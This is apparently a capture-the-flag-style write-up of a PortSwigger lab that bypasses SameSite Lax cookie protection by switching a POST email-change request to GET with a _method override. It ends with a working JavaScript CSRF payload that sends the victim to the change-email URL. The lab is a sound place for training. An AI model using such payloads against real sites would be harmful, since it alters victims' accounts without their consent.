
# SameSite Lax bypass via method override

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Note: The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions




<img width="849" height="674" alt="1" src="https://github.com/user-attachments/assets/2e67b11c-eca2-44a1-b518-3d6f98ef00f7" />


---------------------------------------------

Because Chrome applies Lax restrictions by default, the test looks for a way to perform the email change through a top-level GET navigation. The application's normal request uses POST:



<img width="738" height="483" alt="2" src="https://github.com/user-attachments/assets/483f1624-e9ab-4773-916a-65e9dc44508f" />



The request still succeeds after switching to GET and adding the `_method` parameter:


<img width="739" height="469" alt="3" src="https://github.com/user-attachments/assets/c522baf8-6cb7-4353-bf14-9f390074d6dc" />


Use the following payload for the next step:

```
<script>
    document.location = 'https://0a6d00f7038377ec8069495800fd0010.web-security-academy.net/my-account/change-email?email=test4%40test.com&_method=POST';
</script>
```
